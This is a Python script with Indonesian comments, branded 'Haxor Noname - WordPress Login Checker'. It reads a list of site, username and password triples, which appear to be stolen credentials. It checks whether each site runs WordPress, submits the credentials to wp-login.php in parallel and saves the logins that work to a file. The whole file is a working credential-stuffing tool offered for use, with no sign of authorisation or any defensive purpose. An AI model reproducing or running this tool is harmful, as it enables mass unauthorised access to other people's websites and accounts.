import os
import aiohttp
import asyncio
from colorama import Fore, Style
from concurrent.futures import ProcessPoolExecutor

async def detect_cms(session, url):
    try:
        async with session.get(url) as response:
            html = await response.text()
            if 'wordpress' in html.lower():
                return 'WordPress'
            # Anda bisa menambahkan pengenalan CMS lain di sini
            else:
                return 'Unknown'
    except Exception as e:
        return 'Error'

async def wordpress_login(session, url, username, password):
    try:
        login_data = {
            'log': username.strip(),
            'pwd': password.strip(),
            'wp-submit': 'Log In',
            'redirect_to': url,
        }
        async with session.post(url, data=login_data) as response:
            if 'wp-admin' in response.url:
                print(Fore.GREEN + f"[+] Login berhasil! URL: {url}, Username: {username}, Password: {password}" + Style.RESET_ALL)
                # Menyimpan hasil login ke dalam file sukses.txt
                with open(os.path.join('result-loginwp', 'sukses.txt'), 'a') as success_file:
                    success_file.write(f"URL: {url}, Username: {username}, Password: {password}\n")
            else:
                print(Fore.RED + f"[-] Gagal login dengan {username}:{password}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.YELLOW + f"Error: {e}" + Style.RESET_ALL)

async def process_urls(session, urls):
    tasks = []
    for url, username, password in urls:
        # Menambahkan skema ke URL jika tidak ada
        if not url.startswith('http'):
            url = 'http://' + url
        print(Fore.CYAN + f"[>] Memeriksa {url}..." + Style.RESET_ALL)
        cms = await detect_cms(session, url)
        print(Fore.CYAN + f"[>] CMS: {cms}" + Style.RESET_ALL)
        if cms == 'WordPress':
            print(Fore.CYAN + "[>] Mencoba login..." + Style.RESET_ALL)
            # Menentukan URL login untuk WordPress
            if '/wp-login.php' in url:
                task = asyncio.create_task(wordpress_login(session, url, username, password))
                tasks.append(task)
            else:
                task = asyncio.create_task(wordpress_login(session, url + '/wp-login.php', username, password))
                tasks.append(task)
    await asyncio.gather(*tasks)

async def main():
    # Membuat folder result-loginwp jika belum ada
    if not os.path.exists('result-loginwp'):
        os.makedirs('result-loginwp')

    async with aiohttp.ClientSession() as session:
        # Membaca daftar URL, username, dan password dari file teks
        with open('list.txt', 'r') as file:
            lines = [line.strip().split(':') for line in file if len(line.strip().split(':')) == 3]
            chunk_size = len(lines) // os.cpu_count()
            chunks = [lines[i:i+chunk_size] for i in range(0, len(lines), chunk_size)]

            tasks = []
            for chunk in chunks:
                task = asyncio.create_task(process_urls(session, chunk))
                tasks.append(task)
            
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    print(Fore.BLUE + "Haxor Noname - WordPress Login Checker" + Style.RESET_ALL)
    asyncio.run(main())
